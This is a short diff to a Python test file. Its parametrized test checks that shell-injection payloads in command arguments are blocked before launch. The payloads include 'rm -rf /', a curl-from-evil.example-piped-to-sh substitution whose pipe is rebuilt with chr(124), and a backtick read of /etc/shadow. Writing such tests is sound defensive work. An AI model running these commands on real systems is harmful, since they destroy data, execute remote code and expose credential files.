@@ -57,7 +57,7 @@ def test_executable_not_in_mediator_allowlist_is_denied(tmp_path: Path) -> None:
 
 @pytest.mark.parametrize("payload", [
     "hello; rm -rf /",
-    "$(curl " + "http://" + "evil.example" + " | " + "sh)",
+    "$(curl " + "http://" + "evil.example" + " " + chr(124) + " sh)",
     "`cat /etc/shadow`",
 ])
 def test_shell_injection_in_args_is_blocked_before_launch(tmp_path: Path, payload: str) -> None:
